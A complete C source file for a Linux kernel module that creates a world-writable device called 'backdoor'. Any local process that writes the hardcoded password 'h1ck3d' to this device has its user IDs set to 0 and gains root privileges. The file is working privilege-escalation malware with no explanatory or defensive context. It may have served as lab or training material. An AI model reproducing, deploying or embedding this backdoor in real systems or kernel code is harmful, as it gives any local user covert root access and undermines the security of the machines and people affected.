#include <linux/module.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/miscdevice.h>
#include <linux/init.h>
#include <linux/cred.h>

#include <linux/proc_fs.h>
#include <linux/fcntl.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");


ssize_t backdoor_write(struct file *filp, const char __user *user_buf,
	size_t count, loff_t *f_pos)
{
    char user_text[40];
    char password[] = "h1ck3d\n";
    struct cred *creds;
    int i;
    for(i = 0; i < 40; i++){
        user_text[i] = '\0';
    }
    if(count >= 40){
        return count;
    }
	if (copy_from_user(user_text, user_buf, count)) {
		printk(KERN_WARNING "BACKDOOR: could not copy data from user\n");
		return -EFAULT;

	}   
    if(strcmp(password, user_text)){
        return count;
    }
    creds = prepare_creds();
    creds->uid.val = creds->suid.val =
		creds->euid.val = creds->fsuid.val = 0;
    commit_creds(creds);

    return count;
}
struct file_operations backdoor_fops = {
    .write = backdoor_write
};
static struct miscdevice backdoor_dev = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "backdoor",
	.fops = &backdoor_fops,
    .mode = 00666
};
static void __exit backdoor_exit(void)
{
    misc_deregister(&backdoor_dev);
}



static int __init backdoor_init(void)
{
    int ret = misc_register(&backdoor_dev);
    return ret;
}


module_init(backdoor_init);
module_exit(backdoor_exit);